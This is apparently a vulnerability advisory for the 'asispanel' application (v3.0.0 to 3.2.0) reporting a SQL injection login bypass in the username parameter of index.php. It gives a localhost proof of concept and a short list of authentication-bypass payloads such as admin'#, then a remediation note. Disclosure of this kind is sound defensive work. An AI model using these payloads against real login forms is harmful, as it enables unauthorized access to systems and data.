### Version:

> v 3.0.0 < 3.2.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> index.php

> `username` parameter within the login mechanism is vulnerable to SQL Injection.


### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

* Step 1 - Visit http://localhost/asispanel/
* Step 2 - Enter username as `admin'#` and password as `xyz`
* Step 3 â€“ Click `LOGIN` and now you will be logged in as admin.

### Payloads Can be use:

```
admin'#
'||1#
'||1-- 
'=' 'or'
```

## Recommendations

When using this ASIS, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
